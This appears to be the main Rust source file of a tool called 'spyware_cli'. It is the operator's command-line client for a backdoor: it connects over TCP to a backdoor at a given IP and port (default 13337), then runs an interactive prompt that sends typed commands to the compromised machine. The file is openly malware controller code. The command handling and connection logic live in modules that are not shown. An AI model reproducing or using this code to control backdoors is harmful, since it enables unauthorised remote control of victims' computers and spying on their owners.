mod commanding;
mod commands;
mod connection;

use commanding::handle_user_command;
use connection::connect_to_backdoor;
use std::io;
use std::io::{stdout, ErrorKind, Write};
use std::net::{Shutdown, TcpStream};
use structopt::StructOpt;

#[derive(StructOpt)]
#[structopt(name = "spyware_cli")]
struct Opt {
    /// Destination IP of backdoor to connect to
    ip: String,
    /// Destination port of backdoor to connect to
    #[structopt(short, long, default_value = "13337")]
    port: u16,
}

fn run_cli_prompt(stream: &mut TcpStream) -> io::Result<()> {
    let mut user_command = String::new();
    loop {
        print!("> ");
        // We need to flush stdout because print! does not do it, and there's no newline.
        stdout().flush().unwrap();

        // Read the next command and trim newlines from from it
        io::stdin().read_line(&mut user_command)?;
        user_command = user_command.trim().to_string();

        if !user_command.is_empty() {
            match handle_user_command(&user_command, stream) {
                Ok(_) => {}
                Err(error) => {
                    if ErrorKind::InvalidInput == error.kind() {
                        return Ok(());
                    }
                }
            }
        }

        user_command.clear();
    }
}

fn main() {
    let opt = Opt::from_args();

    let server_address = format!("{}:{}", opt.ip, opt.port);
    println!("Connecting to backdoor at {}", &server_address);
    let mut stream = connect_to_backdoor(&server_address).unwrap();
    run_cli_prompt(&mut stream).expect("Error in CLI prompt");
    println!("Disconnecting from backdoor.");
    stream
        .shutdown(Shutdown::Both)
        .expect("Trying to shut down connection with backdoor failed.");
}
